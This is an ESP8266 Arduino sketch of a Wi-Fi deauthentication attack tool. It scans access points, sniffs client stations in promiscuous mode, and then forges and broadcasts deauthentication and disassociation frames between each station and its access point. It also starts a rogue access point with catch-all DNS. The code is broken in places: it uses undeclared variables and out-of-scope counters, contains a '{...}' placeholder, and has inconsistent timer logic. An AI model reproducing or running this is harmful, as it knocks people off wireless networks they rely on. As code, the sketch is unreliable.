#define MODE_SCAN_APS 0
#define MODE_SCAN_STA 1
#define MODE_DEAUTHER 2
#define MODE_OTHER_SS 3
int varMode = MODE_OTHER_SS;

void setup() {
    WiFi.mode(WIFI_OFF);
    wifi_set_opmode(STATION_MODE);
    wifi_set_promiscuous_rx_cb([](uint8_t* buf, uint16_t len) {sniffer(buf, len);});
    varMode = MODE_SCAN_APS;;
}

/*--------------------------------------------------------------------------------------	
Promiscuous mode can only be enabled in Station mode（1: enable promiscuous）.
• During promiscuous mode (sniffer), ESP8266 Station and SoftAP are disabled.
• Before enable promiscuous mode, please call wifi_station_disconnect first.
• Don’t call any other APIs during sniffer, please call wifi_promiscuous_enable(0) first.
--------------------------------------------------------------------------------------*/	
void sniffer(uint8_t* buf, uint16_t len) {
    if (varMode != MODE_SCAN_STA) return;
    if ((buf[12] == 0xc0) || (buf[12] == 0xa0)) return;
    uint8_t* macTo   = &buf[16]; macFrom = &buf[22];
	memcmp(accesspoints.getMac(i), macTo, 6);
	stations.add(macTo, accesspoints.getID(findAccesspoint(macFrom)));
    stations.add(macFrom, accesspoints.getID(findAccesspoint(macTo)));
}

void loop() {
	currentTime = millis();
	switch (varMode) {
	  case MODE_SCAN_APS:
		int results = 0;
		//-->(async = false & show_hidden = true)
		results = WiFi.scanNetworks(false, true);
		for (int i = 0; i < results && i < maxResults; i++) {...}
		wifi_promiscuous_enable(false);
        WiFi.persistent(false);
        WiFi.disconnect(true);
        wifi_set_opmode(STATION_MODE);
        wifi_promiscuous_enable(true);
		snifferStartTime = millis();
		varMode = MODE_SCAN_STA;
		break;
	  case MODE_SCAN_STA:
		if (currentTime > snifferStartTime + 15000) {
			wifi_promiscuous_enable(false);
			WiFi.softAPConfig(apIP, apIP, netMsk);
			WiFi.softAP(ssid.c_str(), password.c_str(), channel, hidden);
			dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
			dnsServer.start(53, String(ASTERIX), apIP);
			server.on(String(F("/list")).c_str(), HTTP_GET, handleFileList);
			deauthStartTime = millis();
			varMode = MODE_DEAUTHER;
		}
		break;
	  case MODE_DEAUTHER:
        server.handleClient();
        dnsServer.processNextRequest();
		if (currentTime > deauthStartTime + 60000) {
			for (int i = 0; i < results && i < maxResults; i++) {
				int packetSize = sizeof(deauthPacket);
				memcpy(&deauthPacket[4], stMac[i], 6);
				memcpy(&deauthPacket[10], apMac, 6);
				memcpy(&deauthPacket[16], apMac, 6);
				deauthPacket[24] = reason;
				deauthPacket[0] = 0xc0;	sendPacket(deauthPacket, packetSize, channel, 1);
				deauthPacket[0] = 0xa0; sendPacket(deauthPacket, packetSize, channel, 1);
				memcpy(&deauthPacket[4], apMac, 6);
				memcpy(&deauthPacket[10], stMac[i], 6);
				memcpy(&deauthPacket[16], stMac[i], 6);
				deauthPacket[0] = 0xc0;	sendPacket(deauthPacket, packetSize, channel, 1);
				deauthPacket[0] = 0xa0; sendPacket(deauthPacket, packetSize, channel, 1);
			}
		} else {
			getNewAP4Deauth();
			WiFi.softAPConfig(apIP, apIP, netMsk);
			WiFi.softAP(ssid.c_str(), password.c_str(), channel, hidden);
			dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
			dnsServer.start(53, String(ASTERIX), apIP);
			server.on(String(F("/list")).c_str(), HTTP_GET, handleFileList);
			deauthStartTime = millis();
		}
		break;
	  default:
	    prntln(DEAUTHER_VERSION);
		break;
	}
}    
